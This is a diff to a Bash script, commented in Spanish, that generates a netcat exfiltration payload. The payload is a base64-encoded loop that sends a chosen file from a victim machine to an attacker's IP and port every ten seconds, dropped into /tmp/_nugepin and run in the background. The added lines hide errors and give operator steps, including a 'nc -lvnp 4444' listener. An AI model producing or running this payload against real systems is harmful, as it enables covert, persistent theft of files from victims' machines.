@@ -58,9 +58,10 @@
   vRutaAlArchivo="$5"
 
 # Crear payload en base 64
-  vABase64=$(printf "#!/bin/bash\nwhile true; do\n  cat '"$vRutaAlArchivo"' | nc "$vIPAtacante" "$vPuertoAtacante"\n  sleep 10\ndone\n")
+  vABase64=$(printf "#!/bin/bash\nwhile true; do\n  cat '"$vRutaAlArchivo"' | nc "$vIPAtacante" "$vPuertoAtacante" 2> /dev/null \n  sleep 10\ndone\n")
   echo ""
-  echo "Cadena a pasar a base64:" "$vABase64"
+  echo "Cadena a pasar a base64:"
+  echo "$vABase64"
   echo ""
   vParteDelPayloadEnBase64=$(echo -n "$vABase64" | base64 -w 0) # Para que no corte la cadena base64 en dos
   echo ""
@@ -69,6 +70,13 @@
 
 # Mostrar el payload
   echo ""
-  echo " Payload final:"
-  echo "echo 'echo "$vParteDelPayloadEnBase64" | base64 -d > /tmp/_nugepin && chmod +x /tmp/_nugepin && /tmp/_nugepin &' | nc "$vIPVictima" "$vPuertoVictima""
+  echo "  Ejecuta el siguiente payload en una termional de la máquina atacante:"
+  echo ""
+  echo "    echo 'echo "$vParteDelPayloadEnBase64" | base64 -d > /tmp/_nugepin && chmod +x /tmp/_nugepin && /tmp/_nugepin &' | nc "$vIPVictima" "$vPuertoVictima""
+  echo ""
+  echo "  ...y en otra terminal de la máquina atacante ejecuta:"
+  echo ""
+  echo "    nc -lvnp 4444"
+  echo ""
+  echo "  El contenido del archivo llegará cada 10 segundos."
   echo ""
